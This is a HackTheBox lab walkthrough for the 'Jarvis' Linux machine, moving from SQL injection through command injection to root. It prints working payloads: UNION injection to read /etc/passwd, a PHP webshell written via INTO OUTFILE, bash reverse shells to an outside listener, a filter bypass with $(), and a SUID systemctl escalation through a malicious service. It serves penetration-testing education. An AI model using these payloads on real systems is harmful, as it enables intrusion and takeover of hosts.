---
title: "Jarvis - HackTheBox Walkthrough"
date: 2026-01-28 12:00:00 +1100
categories: [HackTheBox, Linux]
tags: [htb, pentesting, sql-injection, command-injection, privilege-escalation, systemctl]
image:
  path: /assets/img/jarvis-header.png
  alt: "Jarvis HTB Machine"
---

Jarvis is a medium-difficulty Linux machine from HackTheBox. We'll exploit SQL injection to get a foothold, use command injection for lateral movement and leverage a misconfigured SUID binary to get root.

## Initial Recon

Started with a port scan to see what's open:

```bash
nmap -p- --min-rate=1000 -T4 10.129.229.137
```

Found three open ports: **22 (SSH)**, **80 (HTTP)** and **64999 (HTTP)**. Let's get more details:

```bash
nmap -sC -sV -p 22,80,64999 10.129.229.137
```

Both HTTP ports are running Apache. Time to check the website.

## Web Enumeration

Visiting `http://10.129.229.137` shows a hotel booking website called "Stark Hotel". I noticed a domain reference `supersecurehotel.htb` in the page source, so I added it to my hosts file:

```bash
echo "10.129.229.137 supersecurehotel.htb" | sudo tee -a /etc/hosts
```

Clicking through the site, the **Rooms** section caught my attention. When you click "Book now!" on a room, it takes you to:

```
http://10.129.229.137/room.php?cod=1
```

That `cod` parameter looks interesting.

## SQL Injection

Time to test if the parameter is vulnerable. I tried these two URLs:

```
http://10.129.229.137/room.php?cod=1 and 1=1-- -
http://10.129.229.137/room.php?cod=1 and 1=2-- -
```

The first one (which is true) shows the room. The second one (which is false) doesn't. That confirms **SQL injection**!

### Finding Injectable Columns

First, I needed to find how many columns are in the table:

```
http://10.129.229.137/room.php?cod=1 order by 7    # Works
http://10.129.229.137/room.php?cod=1 order by 8    # Fails
```

So there are **7 columns**. Now let's see which ones display on the page:

```
http://10.129.229.137/room.php?cod=-1 union select 1,2,3,4,5,6,7
```

The page shows numbers **2, 4 and 5**. Perfect! We can use these positions to extract data.

### Extracting Info

Let's get some database information:

```
http://10.129.229.137/room.php?cod=-1 union select 1,user(),3,4,database(),6,7
```

This revealed:
- Database user: **DBadmin@localhost**  
- Database name: **hotel**

Can we read files? Let's try:

```
http://10.129.229.137/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7
```

Yes! The contents of `/etc/passwd` appeared on the page. Even better, let's check where we can write files:

```
http://10.129.229.137/room.php?cod=-1 union select 1,load_file('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7
```

The config shows the web root is `/var/www/html`.

## Getting a Shell

Time to write a PHP webshell:

```
http://10.129.229.137/room.php?cod=-1 union select 1,'<?php system($_REQUEST["cmd"]);?>',3,4,5,6,7 into outfile '/var/www/html/shell.php'
```

Test it:

```
http://10.129.229.137/shell.php?cmd=id
```

It works! Now for a proper reverse shell. Set up a listener:

```bash
nc -lvnp 4444
```

Then trigger the reverse shell:

```bash
curl -G "http://10.129.229.137/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.80/4444 0>&1'"
```

Got shell as **www-data**!

## Lateral Movement to Pepper

Checking sudo permissions:

```bash
sudo -l
```

We can run `/var/www/Admin-Utilities/simpler.py` as user **pepper** without a password. Let's look at the script:

```bash
cat /var/www/Admin-Utilities/simpler.py
```

The script has a ping function that blocks certain characters: `&`, `;`, `-`, `` ` ``, `||`, `|`

But it doesn't block `$`, `(`, and `)` - which means we can use bash command substitution `$(command)`!

First, create a reverse shell script:

```bash
echo '#!/bin/bash' > /tmp/rev.sh
echo 'bash -i >& /dev/tcp/10.10.14.80/5555 0>&1' >> /tmp/rev.sh
chmod +x /tmp/rev.sh
```

Start a new listener on port 5555, then run:

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
```

When prompted for an IP, enter:

```
$(/tmp/rev.sh)
```

Got shell as **pepper**!

## Privilege Escalation to Root

Looking for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Found `/bin/systemctl` with SUID bit set. That's unusual and exploitable!

Create a malicious service that runs a reverse shell:

```bash
echo '#!/bin/bash' > /dev/shm/root.sh
echo 'bash -i >& /dev/tcp/10.10.14.80/6666 0>&1' >> /dev/shm/root.sh
chmod +x /dev/shm/root.sh
```

Now create the systemd service file:

```bash
echo '[Unit]' > /dev/shm/root.service
echo 'Description=Root' >> /dev/shm/root.service
echo '' >> /dev/shm/root.service
echo '[Service]' >> /dev/shm/root.service
echo 'Type=oneshot' >> /dev/shm/root.service
echo 'ExecStart=/dev/shm/root.sh' >> /dev/shm/root.service
echo '' >> /dev/shm/root.service
echo '[Install]' >> /dev/shm/root.service
echo 'WantedBy=multi-user.target' >> /dev/shm/root.service
```

Start a listener on port 6666, then link and start the service:

```bash
/bin/systemctl link /dev/shm/root.service
/bin/systemctl daemon-reload
/bin/systemctl start root
```

Got **root shell**! 

## Flags

User flag:
```bash
cat /home/pepper/user.txt
```

Root flag:
```bash
cat /root/root.txt
```

## Key Takeaways

- Always test user inputs for SQL injection, especially query parameters
- SQL injection can sometimes lead to file writes, not just data extraction
- Command injection filters can be bypassed if they don't block all dangerous characters
- SUID on system administration tools like `systemctl` is a huge security risk
- Using `/dev/shm` instead of `/tmp` can help bypass certain restrictions

Thanks for reading! Feel free to reach out if you have any questions.
